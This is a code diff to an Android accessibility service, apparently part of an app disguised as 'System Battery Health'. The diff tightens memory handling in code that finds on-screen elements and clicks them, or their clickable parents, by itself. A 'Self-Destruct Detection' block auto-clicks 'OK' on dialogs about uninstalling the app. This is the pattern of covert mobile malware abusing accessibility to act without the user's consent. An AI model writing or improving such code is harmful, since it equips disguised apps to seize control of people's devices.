@@ -58,20 +58,20 @@ class GhostAccessibilityService : AccessibilityService() {
 
                             // Sometimes the parent is the clickable element (e.g. a button container)
                             var parent: AccessibilityNodeInfo? = node.parent
-                            while (parent != null) {
-                                try {
+                            try {
+                                while (parent != null) {
                                     if (parent.isClickable) {
                                         parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                         clicked = true
                                         break
                                     }
                                     val next = parent.parent
-                                    parent.recycle()
+                                    parent.recycle() // Recycle current parent before moving to the next
                                     parent = next
-                                } catch (_: Exception) {
-                                    parent.recycle()
-                                    parent = null
                                 }
+                            } finally {
+                                // Ensure the last-referenced parent node is recycled if it hasn't been already.
+                                parent?.recycle()
                             }
                         } finally {
                             node.recycle()
@@ -87,9 +87,18 @@ class GhostAccessibilityService : AccessibilityService() {
                 // 2. Specific Self-Destruct Detection
                 // If the dialog asks to uninstall "System Battery Health" (Our App Name)
                 val appName = getString(R.string.app_name)
-                if (rootNode.findAccessibilityNodeInfosByText(appName).isNotEmpty()) {
-                    val okNodes = rootNode.findAccessibilityNodeInfosByText("OK")
-                    okNodes.firstOrNull()?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                val appNameNodes = rootNode.findAccessibilityNodeInfosByText(appName)
+                try {
+                    if (appNameNodes.isNotEmpty()) {
+                        val okNodes = rootNode.findAccessibilityNodeInfosByText("OK")
+                        try {
+                            okNodes.firstOrNull()?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        } finally {
+                            okNodes.forEach { it.recycle() }
+                        }
+                    }
+                } finally {
+                    appNameNodes.forEach { it.recycle() }
                 }
             } finally {
                 rootNode.recycle()
